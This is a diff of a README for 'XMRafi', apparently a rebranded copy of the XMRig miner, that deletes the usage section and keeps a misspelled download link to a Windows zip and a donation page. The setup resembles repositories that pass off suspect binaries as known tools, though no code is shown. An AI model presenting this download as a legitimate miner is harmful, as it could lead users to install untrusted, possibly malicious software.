@@ -13,9 +13,6 @@ XMRafi is a High Speed XMR miner high performance, cross platform RandomX, KawPo
 ## Download
 * **[Dowenload](https://github.com/rafilofi2274/XMRafi/blob/main/xmrafi-1.0-best-win.zip)**
 
-## Usage
-The preferred way to configure the miner is the [JSON config file](https://xmrig.com/docs/miner/config) as it is more flexible and human friendly. The [command line interface](https://xmrig.com/docs/miner/command-line-options) does not cover all features, such as mining profiles for different algorithms. Important options can be changed during runtime without miner restart by editing the config file or executing [API](https://xmrig.com/docs/miner/api) calls.
-
 ## Donations
 * donation me any crypto
 * link: (https://sites.google.com/view/crypto-wallets-public/home)
